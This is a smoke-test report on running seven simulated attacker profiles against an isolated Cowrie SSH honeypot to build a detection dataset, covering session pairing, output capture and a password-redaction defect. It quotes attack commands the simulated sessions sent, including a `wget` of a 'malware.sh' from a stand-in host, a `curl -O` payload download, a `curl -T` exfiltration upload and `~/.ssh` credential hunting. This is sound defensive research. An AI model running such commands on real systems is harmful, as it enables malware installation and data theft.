# Cowrie compatibility confirmation smoke test (Dataset V2)

**Date:** 2026-11-10, 10:35–10:41 UTC. **Task 9.**

**Scope:** exactly 7 compatibility profiles × 2 sessions = **14 diagnostic sessions**, run through the unmodified generator 2.1 with `dataset_builder/profiles_v2_compat.json` (`27c4f964…dfb23`) against the existing isolated Cowrie. No retries or replacements.

**Not done:** no dataset was built, and nothing was trained, extracted or modified (generator, profiles, specification, Cowrie, Docker). No TTY use, no test-set access, no commits.

## Evidence (this folder)

| Path | Content |
|---|---|
| `plan_confirmation_sessions.py`, `configs/*.json`, `configs/session_plan.json` | Single-profile configs copied from the compat file; pre-registered planning seeds; pacing seeds checked unused |
| `runs/<profile>/{manifest.jsonl, terminal_output.jsonl, run_meta.json}` | Complete generator output for the 7 runs |
| `evidence/generator_console.txt` | Generator stdout |
| `evidence/cowrie_full_after.json` | Whole `cowrie.json` after the test (504 lines); its first 243 lines hash to the baseline |
| `evidence/cowrie_confirmation_slice.json` | Lines 244–504: **the 261 events of this test** |
| `evidence/cowrie_console_1036_1041.txt` | Cowrie process log for the window (`docker logs`, read-only) |
| `analyze_confirmation.py`, `evidence/comparison.json`, `evidence/profile_table.json` | Manifest / terminal-output / Cowrie comparison and per-profile table |

## 1. Preconditions

All passed.

| Check | Result |
|---|---|
| Containers | `cowrie-project` and `cowrie-ssh-relay` up; image `cowrie/cowrie@sha256:bf371c37…cc13a`; read-only root filesystem; all capabilities dropped; `no-new-privileges`. **StartedAt 09:03:25 UTC, RestartCount 0**: no restart since task 7 |
| Network | Cowrie only on `cowrie_cowrie_internal` (`internal=true`; Cowrie 172.22.0.3, relay 172.22.0.2). From Cowrie: 1.1.1.1, 8.8.8.8, 185.220.101.5, 192.168.65.254 and 172.19.0.1 all *Network is unreachable*; external DNS fails; only route 172.22.0.0/16 |
| Exposure | `docker port`: `127.0.0.1:2223` only; 172.27.0.1, 192.168.56.1 and 172.20.10.5 refuse 2223 |
| Profiles | `profiles_v2_compat.json` loads 7 profiles (`2.2.0-compat`); original and isolated profiles unchanged (`182afa5f…`, `385af936…`) |
| **Baseline** | `cowrie.json` **243 lines, 119,151 bytes, SHA-256 `b82a2a9aa70cc80ec82362f495d4d726479d8f9aebb6729552ed744ae02b7ba4`** (task 7's 241 lines plus 2 lines from this task's isolation probe) |
| Pacing seeds | 9101–9107, one per run; **none used** under `dataset_builder/runs` or `reports/` (`find_pacing_seed_reuse`), and none reused within this test |
| Planning seeds | Seed 1 for every profile; it met the pre-registered coverage rule (botnet plans `wget`, lateral_movement plans the replacement `~/.ssh` step, data_exfiltration plans `curl -T`) |

## 2. Session results

**Pairing:** all **28 Cowrie sessions** (14 logged-in plus 14 rejected guesses) pair one-to-one with the manifests' 28 authentication attempts, by username and password.

| Profile | # | Session | Initial prompt | Sent / planned | Cowrie inputs (excl. exit) = sent, same order | Termination | `exit` in Cowrie | Duration (s) | `tty_output_bytes` | Final event |
|---|---|---|---|---|---|---|---|---|---|---|
| benign_admin | 1 | 17425ebe1dc2 | yes | 5/5 | yes | clean_exit, confirmed | yes | 8.5 | 1,892 | session.closed |
| benign_admin | 2 | 260e705a84f1 | yes | 6/6 | yes | clean_exit, confirmed | yes | 17.6 | 1,245 | session.closed |
| reconnaissance | 1 | b4935be3f118 | yes | 7/7 | yes | clean_exit, confirmed | yes | 18.9 | 8,058 | session.closed |
| reconnaissance | 2 | 985afe58600f | yes | 4/4 | yes | clean_exit, confirmed | yes | 9.0 | 1,410 | session.closed |
| brute_force | 1 | 7cc795c63b60 | yes | 0/0 | yes | clean_exit, confirmed | yes | 2.8 | 315 | session.closed |
| brute_force | 2 | 0a0cb1067322 | yes | 0/0 | yes | clean_exit, confirmed | yes | 2.2 | 315 | session.closed |
| botnet | 1 | bea9802d50a4 | yes | 6/6 | yes | clean_exit, confirmed | yes | 21.8 | 779 | session.closed |
| botnet | 2 | e209f8a07f2f | yes | 5/5 | yes | clean_exit, confirmed | yes | 22.2 | 853 | session.closed |
| privilege_escalation | 1 | 2ce8a7c9c5a3 | yes | 5/5 | yes | clean_exit, confirmed | yes | 28.9 | 2,553 | session.closed |
| privilege_escalation | 2 | 2d000ec0f6a4 | yes | 6/6 | yes | clean_exit, confirmed | yes | 19.7 | 2,095 | session.closed |
| lateral_movement | 1 | 7182e8369178 | yes | 4/4 | yes | clean_exit, confirmed | yes | 10.7 | 640 | session.closed |
| lateral_movement | 2 | c8b5283b1b5a | yes | 2/2 | yes | clean_exit, confirmed | yes | 6.5 | 638 | session.closed |
| data_exfiltration | 1 | e0043f9fb00e | yes | 4/4 | yes | clean_exit, confirmed | yes | 19.9 | 829 | session.closed |
| data_exfiltration | 2 | 76bdccf353a3 | yes | 5/5 | yes | clean_exit, confirmed | yes | 15.3 | 871 | session.closed |

- **Completion:** **14/14 sessions completed with a confirmed `exit`.** 59/59 planned commands were sent, all 59 were recorded by Cowrie in the same order, nothing was missing or extra, and there were **0 readiness timeouts**.
- **Rejected guesses:** all 14 are `rejected` in `auth_log` and `login.failed` in Cowrie, and each closed after 1.1 s.

### Specific checks

- **`wget` to a `.example` name returns the shell [C].**
  - botnet #2 `wget http://mirror.example/malware.sh` → prompt after 0.047 s.
  - Captured output: `Resolving mirror.example (mirror.example)... failed: Temporary failure in name resolution.` / `wget: unable to resolve host address …`, which is Cowrie's handled DNS-failure path.
  - `curl -O http://pkg-repo.example/payload` → `curl: (6) Could not resolve host`, prompt after 0.047 s.
- **The task 7 `wget` hang root cause is proven [C].** Cowrie's console logged `Unhandled error in Deferred … wget.py, line 606, in error: if response.check(error.ConnectingDone) … AttributeError: module 'twisted.internet.error' has no attribute 'ConnectingDone'` at 10:37:41. That is the task 7 `wget`-to-IP Deferred being garbage-collected, and it confirms the code-based diagnosis in `reports/cowrie_profile_compatibility_v2/report.md`.
- **DNS-failed downloads emit no `cowrie.session.file_download.failed` event [C].** The name is resolved before the download handler runs, so the new descriptive field `download_failed_events` counts only non-DNS failures.
- **Replacement lateral steps** (`ls -la ~/.ssh`, `cat ~/.ssh/config`), `ping -c 2` (Cowrie's immediate "bad number" error), `sudo -l` (usage text) and `curl -T` to a documentation IP all returned a prompt.

## 3. Output-capture verification

| Check | Result |
|---|---|
| A capture record for every wait | 73 records (14 initial + 59 after commands), one per wait, in `terminal_output.jsonl` [C] |
| Prompt decisions match the evidence | For all 59 command waits and all 14 initial waits, the decision was `prompt` and `prompt_match` fully matches the prompt pattern. **For 12 of the 14 sessions, the stored output ends with `prompt_match`.** For the 2 botnet sessions it doesn't, because of over-redaction (below). With that undone, all 13 botnet waits are consistent [C] |
| Truncation | 1 truncated record: reconnaissance #1 `ps aux`, 6,258 characters seen, 2,067 stored (≤ 2,048 + marker), still ending with the prompt. The manifest's `output_chars` equals the file's for every sent command [C] |
| Password leakage | No session password of ≥ 4 characters appears in any stored output [C] |
| **Redaction behaviour** | **Defect [C].** No password was typed or echoed in any session, yet `[REDACTED]` appears 23 times: botnet (password `admin` = username, so every prompt `admin@svr04…` was stored as `[REDACTED]@svr04…`) and privilege_escalation (password `user` removed the word "user" from `sudo`'s usage text). The redaction replaces the password *string* anywhere, so common-word passwords destroy unrelated diagnostic text and make the stored evidence disagree with the manifest's unredacted `prompt_match`. Readiness decisions were unaffected (matching runs on the unredacted buffer) |
| Decoding | Cowrie's Unicode quotes in `wget`'s message were stored as `�`. Probably a multi-byte character split across received chunks; the generator decodes each chunk separately [U]. Diagnostic text only; telemetry unaffected |

## 4. Profile-level comparison

| Profile | Attempted | Completed | Early terminations | Planned | Sent | Recorded | Mean duration (s) | Mean recorded inputs | Mean `tty_output_bytes` | Timeouts |
|---|---|---|---|---|---|---|---|---|---|---|
| benign_admin | 2 | 2 | 0 | 11 | 11 | 11 | 13.1 | 5.5 | 1,568.5 | 0 |
| reconnaissance | 2 | 2 | 0 | 11 | 11 | 11 | 13.9 | 5.5 | 4,734.0 | 0 |
| brute_force | 2 | 2 | 0 | 0 | 0 | 0 | 2.5 | 0.0 | 315.0 | 0 |
| botnet | 2 | 2 | 0 | 11 | 11 | 11 | 22.0 | 5.5 | 816.0 | 0 |
| privilege_escalation | 2 | 2 | 0 | 11 | 11 | 11 | 24.3 | 5.5 | 2,324.0 | 0 |
| lateral_movement | 2 | 2 | 0 | 6 | 6 | 6 | 8.6 | 3.0 | 639.0 | 0 |
| data_exfiltration | 2 | 2 | 0 | 9 | 9 | 9 | 17.6 | 4.5 | 850.0 | 0 |

**Compared with task 7:** early terminations are **0/14** (previously 5/10), and the ~20 s timeout component of duration is gone.

**Visible differences** (2 sessions per profile, so **no leakage conclusion is possible**; this is an integration test):

- **brute_force:** distinct on every measure. It has no commands, and `tty_output_bytes` is exactly 315 in both sessions: the login banner, prompt and `exit` echo. That is a consequence of its behaviour (log in, do nothing), and the same value would occur for any `login_no_commands` session.
- **`tty_output_bytes`:** varies strongly with *which* commands Cowrie emulates verbosely. Reconnaissance's `ps aux` and `cat /etc/group` drive it (8,058 vs 1,410 within the profile), as do privilege_escalation's `find`/`sudo` usage text. This depends on Cowrie's emulation output, not on the attacker, which is why `tty_output_bytes` needs its own leakage validation.
- **lateral_movement:** shorter (fewer steps; 2–4 commands).
- **Duration:** varies within profiles about as much as between them (benign 8.5–17.6 s, privilege_escalation 19.7–28.9 s). With shared pacing, duration mostly follows command count.

## 5. Semantic limitations

1. **lateral_movement is reconnaissance-only:** discovery, credential hunting, `~/.ssh` inspection, `ping`/`nc` probing. No connection or pivot attempt is represented.
2. **data_exfiltration** is staging plus an **attempted** `curl -T` upload that fails in the isolated lab. It is not confirmed exfiltration.
3. **Cowrie emulation errors remain in the observed terminal output:** `ping -c` "bad number of packets", `sudo -l` usage text, DNS-failure messages, "command not found" for unimplemented commands. They are part of `tty_output_bytes`.
4. **`tty_output_bytes` requires separate leakage validation** (a core feature with profile-dependent emulation verbosity; section 4).
5. **A returned prompt does not prove that a command succeeded.** In this test most attack-chain commands failed (downloads, execution of missing files, the upload). The manifest records readiness only.

## 6. Conclusion

**2. Requires another generator/profile correction.** This is a small one, in the generator's diagnostic capture only.

**Confirmed:**

- the compatibility profiles work against real Cowrie: 14/14 complete, 0 timeouts;
- the manifest matches Cowrie exactly;
- `wget` to a `.example` name returns;
- prompt detection and truncation work.

**Requires correction before Dataset V2 generation:**

- **(a) Redaction:** make it targeted. It should not replace a password where it is also the username or a common word appearing outside an echoed secret, and it should never alter the prompt region. Otherwise audit evidence is corrupted for any profile with a common-word password, which applies to several credential pools.
- **(b) Optional:** decode terminal output incrementally across chunks, so multi-byte characters aren't replaced.

Neither affects Cowrie telemetry, features or labels. **Implementation of the V2 extractor does not depend on these diagnostics** and could proceed in parallel if you wish. However, the conclusion requested here is about the generator path, which needs this correction and a brief re-check, either by unit tests alone or by unit tests plus a short confirmation; your choice.

## 7. Integrity

- **Repository:** no existing file changed (SHA-256 over all repository files before and after). The 37 new files are all in this folder. `git status` shows only `?? reports/cowrie_compatibility_confirmation/`. `test_touches` = 0.
- **Cowrie:** its data volume gained 261 log events and 14 TTY recordings, as Cowrie does for every session; there were no downloads. The containers weren't restarted (RestartCount 0).
